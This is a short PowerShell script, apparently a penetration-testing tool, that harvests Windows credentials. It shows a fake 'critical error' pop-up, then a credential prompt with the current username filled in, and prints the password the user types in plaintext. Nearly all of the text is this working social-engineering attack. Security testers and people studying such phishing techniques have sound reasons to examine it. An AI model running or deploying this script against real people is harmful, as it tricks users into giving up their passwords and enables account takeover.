<#
    Powershell Popup Pwn
    greg.foss[at]owasp.org
    10/2/2014
    version 0.1 BETA
    
    Simple script that attempts to steal the currently logged in user's credentials via specially crafted pop-up messages.
#>

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 

Set-ForegroundWindow (Get-Process PowerShell).MainWindowHandle

function ppwn() {

Clear-Host
[System.Windows.Forms.MessageBox]::Show("Windows has encountered a critical error!","ERROR - 0xD34D833F::LAYER8",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
$credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", "$env:username", "NetBiosUserName")
$credential.Password | ConvertFrom-SecureString
echo ""
$env:username
$credential.GetNetworkCredential().password
echo ""

}

ppwn